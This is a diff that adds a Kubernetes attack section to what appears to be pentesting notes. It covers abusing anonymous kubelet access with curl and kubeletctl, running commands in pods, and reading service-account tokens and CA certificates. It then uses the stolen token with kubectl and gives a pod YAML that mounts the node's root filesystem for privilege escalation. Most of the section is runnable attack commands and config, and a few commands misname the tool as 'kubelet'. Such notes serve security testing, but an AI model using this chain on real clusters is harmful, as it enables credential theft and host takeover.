@@ -182,3 +182,53 @@ The Control Plane serves as the management layer in a k8s cluster. It consists o
 
 The **Scheduler** (based on the **API Server**) maintains a state of the cluster, and schedules new pods on the nodes. After a node has been decided for a pod, the **API Server** updates the **etcd**.
 
+> By default in many K8s deployments, the Kubelet allows anonymous access. `curl https://[ip]:10250/pods -k | jq .`
+
+### Kubeletctl
+The [kubeletctl](https://github.com/cyberark/kubeletctl) tool is a pentesting tool for k8s. It can do a variety of scans and helpful functions against the kubelet API.
+```bash
+kubeletctl -i --server [ip] pods
+```
+```bash
+kubeletctl -i --server [ip] scan rce
+```
+```bash
+kubeletctl -i --server [ip] exec "id" -p nginx -c nginx
+```
+
+We could use the tool to extract serviceaccount tokens and certs:
+```bash
+kubelet -i --server [ip] exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
+```
+```bash
+kubelet --server [ip] exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
+```
+
+We can then list our privileges with the stolen token:
+```bash
+export token=`cat k8.token`
+kubectl --token=$token --certificate-authority=ca.crt --server=https://[ip]:6443 auth can-i --list
+```
+This token could then be used further to interact with the cluster such as creating pods etc
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privesc
+  namespace: default  
+spec: 
+  containers: 
+  - name: privesc 
+    image: nginx:1.14.2 
+    volumeMounts: 
+    - mountPath: /root
+      name: mount-root-into-mnt 
+  volumes: 
+  - name: mount-root-into-mnt 
+    hostPath: 
+      path: / 
+  automountServiceAccountToken: true
+  hostNetwork: true
+```
+> This pod YAML allows us to mount the root directory of the node
